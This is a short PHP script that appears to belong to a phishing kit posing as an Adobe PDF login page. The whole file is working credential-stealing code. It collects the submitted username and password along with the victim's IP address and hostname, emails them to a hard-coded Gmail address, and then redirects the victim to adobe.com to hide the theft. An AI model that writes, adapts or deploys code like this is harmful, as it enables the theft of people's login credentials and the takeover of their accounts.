<?

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$message .= "Username: ".$_POST['customeru']."\n";
$message .= "Password: ".$_POST['customerp']."\n";
$message .= "\n";
$message .= "Date: ".$adddate."\n";
$message .= "Host: ".$host."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------- DataMASTER -------------\n";
$recipient = "henryparish0@gmail.com";
$subject = "PDF! Successful ".$_POST['username']."\n";
$from = "$ip";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers = "From: $from\r\n";
$headers .= '' . "\r\n";
	 mail("$to", "$subject", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:  https://adobe.com/");

	   }
else
    	   {
		   header("Location:  index.html");

	   }

?>